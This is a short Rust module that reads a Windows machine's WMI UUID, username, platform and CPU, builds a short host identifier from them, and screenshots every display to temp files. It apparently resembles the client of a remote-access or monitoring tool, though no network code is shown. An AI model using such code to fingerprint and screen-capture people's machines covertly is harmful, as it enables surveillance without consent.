use screenshots::{self};
use serde::Deserialize;
use sysinfo::System;
use whoami::{arch, platform, username};
use wmi::{COMLibrary, WMIConnection};


use std::collections::HashMap;
use std;


#[derive(Deserialize, Debug)]
struct Win32ComputerSystemProduct {
    uuid: Option<String>,
}

pub fn get_system_uuid() -> Result<String, Box<dyn std::error::Error>> {
    let com_lib = COMLibrary::new()?;
    let wmi_con = WMIConnection::new(com_lib)?;
    let results: Vec<Win32ComputerSystemProduct> =
        wmi_con.raw_query("SELECT UUID FROM Win32_ComputerSystemProduct")?;
    if let Some(product) = results.first() {
        if let Some(uuid) = &product.uuid {
            return Ok(uuid.to_lowercase());
        }
    }

    Err("Не удалось получить UUID системы".into())
}

pub fn get_info_pc() -> Result<HashMap<String, String>, Box<dyn std::error::Error>> {
    let uuid = get_system_uuid().unwrap();

    let user = username();
    let platform_str = format!("{}-{}", platform(), arch());

    let mut system = System::new();
    system.refresh_cpu_all();
    let processor = system
        .cpus()
        .first()
        .map(|cpu| cpu.brand().to_string())
        .unwrap_or_else(|| "Unknown".to_string());

    let name_short = format!("{}-{}({})", &uuid[..4], platform_str, user);

    let mut result = HashMap::new();
    result.insert("uuid".to_string(), uuid);
    result.insert("name_short".to_string(), name_short);
    result.insert("machine".to_string(), arch().to_string());
    result.insert("processor".to_string(), processor);
    result.insert("user".to_string(), user);

    Ok(result)
}

pub fn media_screenshot() -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let screens=screenshots::Screen::all().unwrap();
    
    let mut paths=Vec::<String>::new();
    for i in screens{
        let  image = i.capture().unwrap();
        let path=std::env::temp_dir().join(format!("s{:?}.png", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap()));
        let _ = image
            .save(&path);
        paths.push(String::from(path.to_str().unwrap()));
    }
    Ok(paths)
}